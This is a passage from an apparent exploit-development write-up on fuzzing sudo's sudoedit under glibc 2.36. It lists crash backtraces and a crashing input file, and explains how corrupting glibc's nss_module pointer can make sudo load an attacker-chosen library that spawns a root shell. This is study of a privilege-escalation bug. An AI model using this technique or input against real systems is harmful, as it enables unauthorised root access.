start=start@entry=0x7fffffffc268, size=size@entry=0x7fffffffc2c8, groupsp=groupsp@entry=0x7fffffffc2d0, limit=limit@entry=-1, errnop=0x7ffff7db86c0) at nss_files/files-initgroups.c:126 #11 0x00007ffff7e8bbd0 in internal_getgrouplist (user=user@entry=0x55555558a588 \u0026#34;root\u0026#34;, group=group@entry=0, size=size@entry=0x7fffffffc2c8, groupsp=groupsp@entry=0x7fffffffc2d0, limit=limit@entry=-1) at ./grp/initgroups.c:101 #12 0x00007ffff7e8be28 in getgrouplist (user=0x55555558a588 \u0026#34;root\u0026#34;, group=0, groups=0x7ffff7cb5010, ngroups=0x7fffffffc334) at ./grp/initgroups.c:156 #13 0x00007ffff7fafde6 in sudo_getgrouplist2_v1 (name=0x55555558a588 \u0026#34;root\u0026#34;, basegid=0, groupsp=0x7fffffffc390, ngroupsp=0x7fffffffc384) at ./getgrouplist.c:105 #14 0x00007ffff7d92953 in sudo_make_gidlist_item (pw=0x55555558a558, unused1=0x0, type=1) at ./pwutil_impl.c:272 #15 0x00007ffff7d91367 in sudo_get_gidlist (pw=0x55555558a558, type=1) at ./pwutil.c:932 #16 0x00007ffff7d89683 in runas_getgroups () at ./match.c:145 #17 0x00007ffff7d772c7 in runas_setgroups () at ./set_perms.c:1714 #18 0x00007ffff7d75ad8 in set_perms (perm=5) at ./set_perms.c:281 #19 0x00007ffff7d6d559 in sudoers_lookup (snl=0x7ffff7db4ce0 \u0026lt;snl\u0026gt;, pw=0x55555558a558, validated=96, pwflag=0) at ./parse.c:303 #20 0x00007ffff7d78776 in sudoers_policy_main (argc=6, argv=0x7fffffffce68, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffcaf0) at ./sudoers.c:328 #21 0x00007ffff7d73a7c in sudoers_policy_check (argc=6, argv=0x7fffffffce68, env_add=0x0, command_infop=0x7fffffffcbd8, argv_out=0x7fffffffcbe0, user_env_out=0x7fffffffcbe8) at ./policy.c:872 #22 0x0000555555572f88 in policy_check (plugin=0x555555583920 \u0026lt;policy_plugin\u0026gt;, argc=6, argv=0x7fffffffce68, env_add=0x0, command_info=0x7fffffffcbd8, argv_out=0x7fffffffcbe0, user_env_out=0x7fffffffcbe8) at ./sudo.c:1186 #23 0x000055555556e6ed in main (argc=8, argv=0x7fffffffce58, envp=0x7fffffffcea0) at ./sudo.c:301 count: 1 files: inp.564004 #0 __pthread_kill_implementation (threadid=\u0026lt;optimized out\u0026gt;, signo=signo@entry=6, no_tid=no_tid@entry=0) at ./nptl/pthread_kill.c:44 #1 0x00007ffff7e45e8f in __pthread_kill_internal (signo=6, threadid=\u0026lt;optimized out\u0026gt;) at ./nptl/pthread_kill.c:78 #2 0x00007ffff7df6fb2 in __gi_raise (sig=sig@entry=6) at ../sysdeps/posix/raise.c:26 #3 0x00007ffff7de1472 in __gi_abort () at ./stdlib/abort.c:79 #4 0x00007ffff7e3a430 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7ffff7f54459 \u0026#34;%s\\n\u0026#34;) at ../sysdeps/posix/libc_fatal.c:155 #5 0x00007ffff7e4f7aa in malloc_printerr (str=str@entry=0x7ffff7f52040 \u0026#34;corrupted size vs. prev_size\u0026#34;) at ./malloc/malloc.c:5660 #6 0x00007ffff7e5006e in unlink_chunk (p=p@entry=0x555555595210, av=0x7ffff7f8dc60 \u0026lt;main_arena\u0026gt;) at ./malloc/malloc.c:1623 #7 0x00007ffff7e516db in _int_free (av=0x7ffff7f8dc60 \u0026lt;main_arena\u0026gt;, p=0x5555555941c0, have_lock=\u0026lt;optimized out\u0026gt;, have_lock@entry=0) at ./malloc/malloc.c:4612 #8 0x00007ffff7e53e8f in __gi___libc_free (mem=\u0026lt;optimized out\u0026gt;) at ./malloc/malloc.c:3385 #9 0x00007ffff7ded5b0 in __gi_setlocale (category=\u0026lt;optimized out\u0026gt;, locale=\u0026lt;optimized out\u0026gt;) at ./locale/setlocale.c:401 #10 0x00007ffff7d114e6 in sudoers_setlocale (newlocale=1, prevlocale=0x7fffffffd54c) at ./locale.c:120 #11 0x00007ffff7d21753 in sudoers_policy_main (argc=14, argv=0x7fffffffd9a8, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffd630) at ./sudoers.c:327 #12 0x00007ffff7d1ca7c in sudoers_policy_check (argc=14, argv=0x7fffffffd9a8, env_add=0x0, command_infop=0x7fffffffd718, argv_out=0x7fffffffd720, user_env_out=0x7fffffffd728) at ./policy.c:872 #13 0x0000555555572f88 in policy_check (plugin=0x555555583920 \u0026lt;policy_plugin\u0026gt;, argc=14, argv=0x7fffffffd9a8, env_add=0x0, command_info=0x7fffffffd718, argv_out=0x7fffffffd720, user_env_out=0x7fffffffd728) at ./sudo.c:1186 #14 0x000055555556e6ed in main (argc=16, argv=0x7fffffffd998, envp=0x7fffffffda20) at ./sudo.c:301 last_fuzzer_iteration: 565233 total unique crashes : 161 as you can see, for each unique crash, we print the number of times that the crash happened, all input files that trigger the crash, and a sample backtrace. so, what do we do next?\nmanual triaging we have 161 unique crashes. welp, we simply manually analyze them one by one. in the sudo playlist from liveoverflow, we were looking for a crash in __tsearch. but i didn\u0026rsquo;t observe any crashes there, ever. and i ran the fuzzer for hours. maybe 1-2 days\u0026hellip;\nmy dumb brain, in ignorance of what i was to expect when i started this journey, i swtitched from ubuntu:20.04 in the dockerfile to from debian:12.5 for reasons uncomprehendable to me. well, ubuntu 20.04 is running glibc-2.31 and __tsearch appears in nss/nsswitch.c:__nss_lookup_function.\nhowever, debian 12.5 is running gnu c library (debian glibc 2.36-9+deb12u4) stable release version 2.36. and if we look at the source code and the references of __tsearch, it is nowhere to be found in the nss library!\nduring my manual triaging, i was blaming the fuzzer for the absence of a __tsearch crash and didn\u0026rsquo;t realize that there was no __tsearch to crash in the first place! nevertheless, i didn\u0026rsquo;t give up and went through the 161 crashes manually\u0026hellip;\nsome of them were easily discardable and others i loaded them into gdb to inspect things. crashes that contained __gi___nss_lookup_function and __nss_module_load seemed the most promising ones. this is because these functions indicate that they load some native library. our exploitation idea here is to corrupt some heap data so that they load an arbitrary library of our choice instead. if we manage to make sudo to load an arbitrary library, then it is game over. the reason is that we can craft a library that uses the __attribute__ ((constructor)) to execute code upon loading, which can be an execve(\u0026quot;/bin/sh\u0026quot;).\nso, out of all the crashes, manual debugging, and trial and error, the one that eventually stood out was the following:\ncount: 3 files: inp.457687, inp.552213, inp.553068 #0 __nss_module_get_function (module=0x4242424242424242, name=name@entry=0x7ffff7f52525 \u0026#34;initgroups_dyn\u0026#34;) at ./nss/nss_module.c:336 #1 0x00007ffff7eecfad in __gi___nss_lookup_function (ni=\u0026lt;optimized out\u0026gt;, fct_name=fct_name@entry=0x7ffff7f52525 \u0026#34;initgroups_dyn\u0026#34;) at ./nss/nsswitch.c:137 #2 0x00007ffff7e8bb8c in internal_getgrouplist (user=user@entry=0x55555558e4f8 \u0026#34;root\u0026#34;, group=group@entry=0, size=size@entry=0x7fffffffd2f8, groupsp=groupsp@entry=0x7fffffffd300, limit=limit@entry=-1) at ./grp/initgroups.c:95 #3 0x00007ffff7e8be28 in getgrouplist (user=0x55555558e4f8 \u0026#34;root\u0026#34;, group=0, groups=0x7ffff7c5e010, ngroups=0x7fffffffd364) at ./grp/initgroups.c:156 #4 0x00007ffff7fafde6 in sudo_getgrouplist2_v1 (name=0x55555558e4f8 \u0026#34;root\u0026#34;, basegid=0, groupsp=0x7fffffffd3c0, ngroupsp=0x7fffffffd3b4) at ./getgrouplist.c:105 #5 0x00007ffff7d3b953 in sudo_make_gidlist_item (pw=0x55555558e4c8, unused1=0x0, type=1) at ./pwutil_impl.c:272 #6 0x00007ffff7d3a367 in sudo_get_gidlist (pw=0x55555558e4c8, type=1) at ./pwutil.c:932 #7 0x00007ffff7d32683 in runas_getgroups () at ./match.c:145 #8 0x00007ffff7d202c7 in runas_setgroups () at ./set_perms.c:1714 #9 0x00007ffff7d1ead8 in set_perms (perm=5) at ./set_perms.c:281 #10 0x00007ffff7d16559 in sudoers_lookup (snl=0x7ffff7d5dce0 \u0026lt;snl\u0026gt;, pw=0x55555558e4c8, validated=96, pwflag=0) at ./parse.c:303 #11 0x00007ffff7d21776 in sudoers_policy_main (argc=6, argv=0x7fffffffde98, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffdb20) at ./sudoers.c:328 #12 0x00007ffff7d1ca7c in sudoers_policy_check (argc=6, argv=0x7fffffffde98, env_add=0x0, command_infop=0x7fffffffdc08, argv_out=0x7fffffffdc10, user_env_out=0x7fffffffdc18) at ./policy.c:872 #13 0x0000555555572f88 in policy_check (plugin=0x555555583920 \u0026lt;policy_plugin\u0026gt;, argc=6, argv=0x7fffffffde98, env_add=0x0, command_info=0x7fffffffdc08, argv_out=0x7fffffffdc10, user_env_out=0x7fffffffdc18) at ./sudo.c:1186 #14 0x000055555556e6ed in main (argc=8, argv=0x7fffffffde88, envp=0x7fffffffded0) at ./sudo.c:301 as you can see, we are crashing in __nss_module_get_function, which when there is no crash, further down its path invokes __nss_module_load. we control the module argument, which is of type struct nss_module. i won\u0026rsquo;t bore you with libc internals but will get straight to the point:\n/* a nss service module (potentially unloaded). client code should use the functions below. */ struct nss_module { int state; //... /* only used for __libc_freeres unloading. */ void *handle; /* the next module in the list. */ struct nss_module *next; /* the name of the module (as it appears in /etc/nsswitch.conf). */ char name[]; }; // let\u0026#39;s examine the backtrace now and understand how we can reash // `__nss_module_load` from `__nss_module_get_function`. // code heavily simplified. // https://elixir.bootlin.com/glibc/glibc-2.36.9000/source/grp/initgroups.c#l95 internal_getgrouplist() { __nss_lookup_function (nip, \u0026#34;initgroups_dyn\u0026#34;); } // https://elixir.bootlin.com/glibc/glibc-2.36.9000/source/nss/nsswitch.c#l137 __nss_lookup_function (nss_action_list ni, const char *fct_name) { return __nss_module_get_function (ni-\u0026gt;module, fct_name); } // https://elixir.bootlin.com/glibc/glibc-2.36.9000/source/nss/nss_module.c#l336 __nss_module_get_function (struct nss_module *module, const char *name) { /* a successful dlopen might clobber errno. */ int saved_errno = errno; if (!__nss_module_load (module)) //... } __nss_module_load (struct nss_module *module) { switch ((enum nss_module_state) atomic_load_acquire (\u0026amp;module-\u0026gt;state)) { case 0: //nss_module_uninitialized return module_load (module); //... } } module_load (struct nss_module *module) { if (strcmp (module-\u0026gt;name, \u0026#34;files\u0026#34;) == 0) return module_load_nss_files (module); if (strcmp (module-\u0026gt;name, \u0026#34;dns\u0026#34;) == 0) return module_load_nss_dns (module); void *handle; { char *shlib_name; if (__asprintf (\u0026amp;shlib_name, \u0026#34;libnss_%s.so%s\u0026#34;, module-\u0026gt;name, __nss_shlib_revision) \u0026lt; 0) /* this is definitely a temporary failure. do not update module-\u0026gt;state. this will trigger another attempt at the next call. */ return false; handle = __libc_dlopen (shlib_name); //our job is done if __libc_dlopen succeeds } } //... so, as you can see, if the following pre-conditions hold:\nmodule-\u0026gt;state == 0 module-\u0026gt;name is a valid pointer to a string then we can load the library named libnss_%s.so.2. recall our stacktrace:\n#0 __nss_module_get_function (module=0x4242424242424242, name=name@entry=0x7ffff7f52525 \u0026#34;initgroups_dyn\u0026#34;) exploit development we control the function pointer module completely. however we have no leaks. maybe with a partial overwrite of the pointer we are lucky and our pre-condtiions can be met. here is the inp.553068 file that causes this crash:\n{ \u0026#34;input\u0026#34;: { \u0026#34;gdbcmd\u0026#34;: [ \u0026#34;gdb\u0026#34;, \u0026#34;-q\u0026#34;, \u0026#34;-iex\u0026#34;, \u0026#34;set confirm off\u0026#34;, \u0026#34;-iex\u0026#34;, \u0026#34;set pagination off\u0026#34;, \u0026#34;-iex\u0026#34;, \u0026#34;set disable-randomization on\u0026#34;, \u0026#34;-iex\u0026#34;, \u0026#34;set exec-wrapper ./gdb-argv0-wrapper.sh ./////0edit\u0026#34;, \u0026#34;-x\u0026#34;, \u0026#34;./gdbscript.py\u0026#34;, \u0026#34;--nh\u0026#34;, \u0026#34;--args\u0026#34;, \u0026#34;./0edit\u0026#34;, \u0026#34;-hb\u0026#34;, \u0026#34;-i\u0026#34;, \u0026#34;aaaaaaaaaaaaaaaaaaaa\\\\\u0026#34;, \u0026#34;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\u0026#34;, \u0026#34;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\u0026#34;, \u0026#34;bbb\u0026#34;, \u0026#34;bbbbbb\u0026#34; ], \u0026#34;cmd\u0026#34;: [ \u0026#34;./////0edit\u0026#34;, \u0026#34;-hb\u0026#34;, \u0026#34;-i\u0026#34;, \u0026#34;aaaaaaaaaaaaaaaaaaaa\\\\\u0026#34;, \u0026#34;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\u0026#34;, \u0026#34;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\u0026#34;, \u0026#34;bbb\u0026#34;, \u0026#34;bbbbbb\u0026#34; ], \u0026#34;env\u0026#34;: { \u0026#34;pwnlib_noterm\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;home\u0026#34;: \u0026#34;/root\u0026#34;, \u0026#34;lc_ctype\u0026#34;: \u0026#34;c.utf-8\u0026#34;, \u0026#34;tz\u0026#34;: \u0026#34;nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn\u0026#34;, \u0026#34;gconv_path\u0026#34;: \u0026#34;qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq\u0026#34;, \u0026#34;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\u0026#34;: \u0026#34;000000000000000000000000000000000000000000000000\u0026#34; } }, \u0026#34;output\u0026#34;: { \u0026#34;raw\u0026#34;: \u0026#34;\u0026lt;omitted\u0026gt;\u0026#34;, \u0026#34;reason\u0026#34;: \u0026#34;sigsegv\u0026#34;, \u0026#34;context\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;env\u0026#34;: { \u0026#34;pwnlib_noterm\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;home\u0026#34;: \u0026#34;/root\u0026#34;, \u0026#34;lc_ctype\u0026#34;: \u0026#34;c.utf-8\u0026#34;, \u0026#34;tz\u0026#34;: \u0026#34;nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn\u0026#34;, \u0026#34;gconv_path\u0026#34;: \u0026#34;qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq\u0026#34;, \u0026#34;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\u0026#34;: \u0026#34;000000000000000000000000000000000000000000000000\u0026#34;, \u0026#34;lines\u0026#34;: \u0026#34;24\u0026#34;, \u0026#34;columns\u0026#34;: 